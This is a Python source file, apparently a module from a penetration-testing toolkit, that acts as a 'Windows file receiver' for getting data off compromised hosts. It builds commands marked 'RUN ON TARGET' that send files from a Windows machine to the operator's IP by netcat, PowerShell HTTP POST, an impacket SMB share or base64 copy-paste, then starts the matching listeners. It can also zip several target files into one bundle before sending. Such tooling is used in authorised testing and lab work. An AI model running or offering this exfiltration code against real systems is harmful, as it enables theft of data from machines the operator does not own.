import base64
import shutil
import socket
import subprocess
import sys
import zipfile

from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def detect_ip():

    try:

        result = subprocess.check_output(
            ["ip", "-br", "addr", "show", "dev", "tun0"],
            text=True
        )

        parts = result.split()

        if len(parts) >= 3:

            return parts[2].split("/")[0]

    except Exception:
        pass

    try:

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM
        )

        s.connect(
            ("1.1.1.1", 80)
        )

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


def require_outfile(args):

    outfile = getattr(
        args,
        "file",
        None
    )

    if not outfile:

        console.print("[red][!] Missing output filename[/red]")

        return None

    return Path(outfile)


def _print_script(lines, title):

    #
    # No box — a bordered panel puts a leading "│" on every line, which a
    # drag-select-to-copy off the terminal (no clipboard access, over SSH,
    # etc.) would grab too. A rule frames it without touching the text.
    #
    console.print()
    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
    console.print()

    for line in lines:
        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)

    console.print()


# =========================================================
# NC
# =========================================================

def mode_nc(
    outfile,
    ip,
    port
):

    #
    # PowerShell reserves "<" for input redirection but has never
    # implemented it (RedirectionNotSupported, every version) — cmd.exe
    # is the only shell that actually honors it. Wrapping in cmd /c makes
    # this work from a PowerShell prompt too, without changing behavior
    # if already in cmd.exe.
    #
    cmd = (
        f'cmd /c "nc {ip} {port} '
        f'< {outfile.name}"'
    )

    _print_script([cmd], "RUN ON TARGET — PowerShell")

    copy_clipboard(cmd)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print(f"[yellow][*] Listening {ip}:{port} -> {outfile}[/yellow]", highlight=False)

    subprocess.run(
        f"nc -lvnp {port} > '{outfile}'",
        shell=True
    )


# =========================================================
# HTTP
# =========================================================

def mode_http(
    outfile,
    ip,
    port
):

    cmd = (
        f"Invoke-WebRequest "
        f"-Uri http://{ip}:{port} "
        f"-Method POST "
        f"-InFile {outfile.name}"
    )

    _print_script([cmd], "RUN ON TARGET — PowerShell")

    copy_clipboard(cmd)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print(f"[yellow][*] Listening on {port}...[/yellow]", highlight=False)

    tmp = Path(
        f"{outfile}.tmp"
    )

    subprocess.run(
        f"nc -lvnp {port} > '{tmp}'",
        shell=True
    )

    raw = tmp.read_bytes()

    split = raw.find(
        b"\r\n\r\n"
    )

    if split != -1:

        outfile.write_bytes(
            raw[split + 4:]
        )

    else:

        outfile.write_bytes(
            raw
        )

    tmp.unlink(
        missing_ok=True
    )

    console.print(f"[green][+] Saved -> {outfile}[/green]", highlight=False)


# =========================================================
# SMB
# =========================================================

def mode_smb(
    outfile,
    ip,
    share
):

    share_dir = Path(
        share
    )

    share_dir.mkdir(
        exist_ok=True
    )

    cmd = (
        f"copy {outfile.name} "
        f"\\\\{ip}\\{share}\\"
        f"{outfile.name}"
    )

    _print_script([cmd], "RUN ON TARGET — cmd")

    copy_clipboard(cmd)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print(f"[yellow][*] Starting SMB share /{share}[/yellow]", highlight=False)

    try:

        subprocess.run(
            [
                "impacket-smbserver",
                share,
                str(share_dir),
                "-smb2support"
            ]
        )

    except FileNotFoundError:

        subprocess.run(
            [
                "python3",
                "-m",
                "impacket.smbserver",
                share,
                str(share_dir),
                "-smb2support"
            ]
        )


# =========================================================
# OFFLINE
# =========================================================

def mode_offline(
    outfile
):

    cmd = (
        "[Convert]::ToBase64String("
        f"[IO.File]::ReadAllBytes('{outfile.name}')"
        ")"
    )

    _print_script([cmd], "RUN ON TARGET — PowerShell")

    copy_clipboard(cmd)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()
    console.print("[bold blue][*][/bold blue] Paste the base64 output below (Ctrl-D when done):")
    console.print()

    data = (
        sys.stdin
        .read()
    )

    data = "".join(
        data.split()
    )

    outfile.write_bytes(
        base64.b64decode(data)
    )

    console.print(f"[green][+] Decoded and saved to: {outfile}[/green]", highlight=False)


# =========================================================
# MENU
# =========================================================

def choose_mode():

    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
    table.add_column(style="bold cyan", no_wrap=True)
    table.add_column(style="white")
    table.add_column(style="dim")

    table.add_row("[1] HTTP", "POST upload", "one-shot receiver, decodes on arrival")
    table.add_row("[2] NC", "raw netcat", "simplest, needs an open listener port")
    table.add_row("[3] SMB", "impacket share", "target copies straight to a share")
    table.add_row("[4] Offline", "base64 paste", "no network in/out at all")

    console.print()
    console.print(
        Panel(
            table,
            title="[bold white]WINDOWS FILE RECEIVER[/bold white]",
            title_align="left",
            border_style="blue",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    choice = input(f"\n{B}select> {W}").strip()

    return {
        "1": "http",
        "2": "nc",
        "3": "smb",
        "4": "offline",
    }.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def receive_windows_file(
    outfile,
    method=None,
    ip=None,
    port=None,
    share="data"
):

    outfile = Path(
        outfile
    )

    if not ip:

        ip = detect_ip()

    if not method:

        method = choose_mode()

    if not method:
        return

    if method == "nc":

        mode_nc(
            outfile,
            ip,
            port or 9001
        )

    elif method == "http":

        mode_http(
            outfile,
            ip,
            port or 8080
        )

    elif method == "smb":

        mode_smb(
            outfile,
            ip,
            share
        )

    elif method == "offline":

        mode_offline(
            outfile
        )


def receive_windows_files(
    outfiles,
    archive_name="bundle.zip",
    method=None,
    ip=None,
    port=None,
    share="data"
):

    #
    # One archive instead of N separate transfers — the target zips
    # everything into a single file, so only one on-target command needs
    # copy-pasting regardless of how many files are involved.
    #
    outfiles = [Path(f) for f in outfiles]

    file_list = ", ".join(f'"{f.name}"' for f in outfiles)

    cmd = (
        f"Compress-Archive -Path {file_list} "
        f"-DestinationPath {archive_name} -Force"
    )

    _print_script([cmd], "RUN ON TARGET — PowerShell (bundle before sending)")

    copy_clipboard(cmd)

    console.print("[green]→ copied to clipboard[/green]")

    archive_path = Path(archive_name)

    receive_windows_file(
        outfile=archive_path,
        method=method,
        ip=ip,
        port=port,
        share=share
    )

    if not archive_path.is_file():
        return

    with zipfile.ZipFile(archive_path) as zf:
        zf.extractall(".")

    archive_path.unlink(missing_ok=True)

    console.print("[green][+] Extracted archive contents[/green]", highlight=False)


def run(
    data=None,
    cred=None,
    args=None
):

    outfile = require_outfile(
        args
    )

    if not outfile:
        return data

    method = getattr(
        args,
        "method",
        None
    )

    port = getattr(
        args,
        "port",
        None
    )

    share = getattr(
        args,
        "share",
        "data"
    )

    receive_windows_file(
        outfile=outfile,
        method=method,
        port=port,
        share=share
    )

    return data